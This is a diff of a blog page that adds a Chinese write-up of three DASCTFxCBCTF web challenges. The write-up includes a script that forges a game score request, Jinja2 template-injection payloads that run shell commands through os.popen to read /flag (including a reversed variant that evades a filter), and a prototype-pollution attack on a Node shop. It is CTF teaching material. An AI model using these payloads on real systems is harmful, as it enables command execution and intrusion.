@@ -4,8 +4,16 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="test, Ethe&#39;s blog">
-    <meta name="description" content="">
+    <meta name="keywords" content="DASCTFxCBCTF, Ethe&#39;s blog">
+    <meta name="description" content="WEBdino3d进入后是一个3d版的游戏，死亡后会提示说玩够一百万分就能拿到flag
+
+先来个非预期
+我们在控制台可以看到score的属性
+
+我们可以通过修改score.score的方式来修改我们的分数
+
+然后是预期解
+在js的源码里可以">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +25,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>test | Ethe&#39;s blog</title>
+    <title>DASCTFxCBCTF | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -321,12 +329,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/18.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">test</h1>
+                    <h1 class="description center-align post-title">DASCTFxCBCTF</h1>
                 </div>
             </div>
         </div>
@@ -468,28 +476,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-06-30
+                    2022-09-20
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-06-30
+                    2022-09-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    957
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    4 分
                 </div>
                 
 
@@ -512,7 +520,86 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="dino3d"><a href="#dino3d" class="headerlink" title="dino3d"></a>dino3d</h2><p>进入后是一个3d版的游戏，死亡后会提示说玩够一百万分就能拿到flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920164212534.png" alt="QQ截图20220920165732"></p>
+<p>先来个非预期</p>
+<p>我们在控制台可以看到score的属性</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920175500274.png" alt="image-20220920175500274"></p>
+<p>我们可以通过修改score.score的方式来修改我们的分数</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920175655019.png" alt="image-20220920175655019"></p>
+<p>然后是预期解</p>
+<p>在js的源码里可以看到最后有这么一部分</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920175915900.png" alt="image-20220920175915900"></p>
+<pre class="language-js" data-language="js"><code class="language-js"><span class="token function">sn</span><span class="token punctuation">(</span><span class="token parameter">e<span class="token punctuation">,</span> t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    e <span class="token operator">&amp;&amp;</span> t <span class="token operator">&amp;&amp;</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/check.php"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        method<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
+        headers<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">"Content-type"</span><span class="token operator">:</span> <span class="token string">"application/x-www-form-urlencoded; charset=UTF-8"</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        body<span class="token operator">:</span> <span class="token string">"score="</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;checkCode="</span> <span class="token operator">+</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> t<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;tm="</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token operator">=></span>e<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token operator">=></span><span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>e和t分别为分数和checkCode</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920180224487.png" alt="image-20220920180224487"></p>
+<p>checkCode由两部分组成</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920180251683.png" alt="image-20220920180251683"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920180305217.png" alt="image-20220920180305217"></p>
+<p>所以t=checkCode=DASxCBCTF_wElc03e</p>
+<p>也就是向check.php发送post请求，其中有三个参数，score、checkCode、tm，score是我们的分数。我们可以设成1000000，这里的checkCode是md5(score.score+checkCode)，及md5(1000000DASxCBCTF_wElc03e),tm就是个时间戳</p>
+<p>所以可以编写脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python">import requests
+import time
+
+url &#x3D; &#39;http:&#x2F;&#x2F;node4.buuoj.cn:27211&#x2F;check.php&#39;
+headers &#x3D; &#123;
+              &quot;Content-type&quot;: &quot;application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8&quot;
+          &#125;
+data &#x3D; &#123;
+    &quot;score&quot;: &quot;1000000&quot;,
+    &quot;checkCode&quot;: &#39;4639d0ab43e9030749f450eb6e9fbb97&#39;,
+    &quot;tm&quot;: str(time.time())[:10]
+&#125;
+rep &#x3D; requests.post(url, data&#x3D;data, headers&#x3D;headers).text
+print(rep)</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920181636482.png" alt="image-20220920181636482"></p>
+<h2 id="Text-Reverser"><a href="#Text-Reverser" class="headerlink" title="Text Reverser"></a>Text Reverser</h2><p>SSTI但是过滤了<code>&#123;&#123;</code>，然后还把输入的内容进行了反序输出的操作，所以我们的payload在输入之前就要有一个反序的操作</p>
+<p><code>&#123;&#123;</code>没了可以用<code>&#123;%%&#125;</code>替代</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920184914991.png" alt="image-20220920184914991"></p>
+<p>照着这个payload改一下</p>
+<pre class="language-none"><code class="language-none">&#123;%print(&#39;&#39;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read())%&#125;</code></pre>
+
+<p>改了之后的payload为</p>
+<pre class="language-none"><code class="language-none">&#123;%print(&#39;&#39;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;nl &#x2F;flag&#39;).read())%&#125;</code></pre>
+
+<p>然后逆序一下</p>
+<pre class="language-none"><code class="language-none">&#125;%))(daer.)&#39;galf&#x2F; ln&#39;(]&#39;nepop&#39;[__slabolg__.__tini__.]231[)(__sessalcbus__.__esab__.__ssalc__.&#39;&#39;(tnirp%&#123;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920185701419.png" alt="image-20220920185701419"></p>
+<h2 id="cbshop"><a href="#cbshop" class="headerlink" title="cbshop"></a>cbshop</h2><p>js的题，有附件，down下来审一下，主要是app.js。</p>
+<p>题目主要功能就是用钱来买flag，但是普通用户只有10$，不可能买到11$的flag，而admin用户有9999，可以用来购买flag，于是我们就需要登录admin账号</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223605085.png" alt="image-20220920223605085"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223623009.png" alt="image-20220920223623009"></p>
+<p>从这里可以得到密码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223814625.png" alt="image-20220920223814625"></p>
+<p>登录之后发现钱够了但还是买不到flag。因为源码里在购买的部分还存在验证</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223922197.png" alt="image-20220920223922197"></p>
+<p>product的值就是我们的传参</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920224005169.png" alt="image-20220920224005169"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920224014603.png" alt="image-20220920224014603"></p>
+<p>然后存在三个if判断，首先判断id是否为2，然后判断money是否大于11，并且是否存在一个user.token，最后一个if判断我们post传入的内容是否有flag这个关键字，如果有就提示go to ’readFileSync‘。如果没有就读取文件名为name的值的文件里面的内容。</p>
+<p>第一个条件好满足，我们先来看第二个。首先我们知道user的构造如下，并没有token这个属性</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920224521771.png" alt="image-20220920224521771"></p>
+<p>所以如果我们想添加一个user.token的值，就需要借助原型链污染（<a href="https://ethe448.github.io/2022/02/21/js%E6%BC%8F%E6%B4%9E/">js漏洞 | Ethe&#39;s blog (ethe448.github.io)</a>）。而代码中正好存在利用的地方，这是一个进行复制操作的函数。</p>
+<p><code>    Object.assign(order[user.username], product);</code></p>
+<p>如果user.username=__proto__，那么在执行这段代码的时候，就会造成我们的原型链污染。product的值我们可控。也就实现了为其添加user对象添加token属性的目的</p>
+<p>所以首先是把user.username改成__proto__</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223520791.png" alt="image-20220920223520791">接下来就是传入product，name的值是我们想读的文件名，也就是/flag，然后添加一个token属性就可以。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223407034.png" alt="image-20220920223407034"></p>
+<p>由于第三个if的原因，所以第一次传参的时候是会被拦下来的。所以我们需要第二次传参，因为之前我们以及把name的值赋成了/flag，所以第二次传参就不再需要了（其实第二次随便传个json格式的内容就行，只要不覆盖第一次传的值。）。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223342590.png" alt="image-20220920223342590"></p>
+
                 
             </div>
             <hr/>
@@ -538,7 +625,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2022/06/30/test/">https://Ethe448.github.io/2022/06/30/test/</a>
+                    <a href="https://Ethe448.github.io/2022/09/20/DASCTFxCBCTF/">https://Ethe448.github.io/2022/09/20/DASCTFxCBCTF/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1018,13 +1105,13 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2022/06/30/test/">
+                <a href="/2022/09/20/DASCTFxCBCTF/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/23.jpg" class="responsive-img" alt="test">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/18.jpg" class="responsive-img" alt="DASCTFxCBCTF">
                         
-                        <span class="card-title">test</span>
+                        <span class="card-title">DASCTFxCBCTF</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1035,7 +1122,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-06-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-20
                             </span>
                         <span class="publish-author">
                             
@@ -1056,13 +1143,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/">
+                <a href="/2022/06/28/tsgw/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/7.jpg" class="responsive-img" alt="dest0g3 520迎新赛wp">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/4.jpg" class="responsive-img" alt="天山固网">
                         
-                        <span class="card-title">dest0g3 520迎新赛wp</span>
+                        <span class="card-title">天山固网</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1073,7 +1160,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-06-28
                             </span>
                         <span class="publish-author">
                             
@@ -1291,7 +1378,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">159.8k</span>
+                        class="white-color">170k</span>
             
             
             
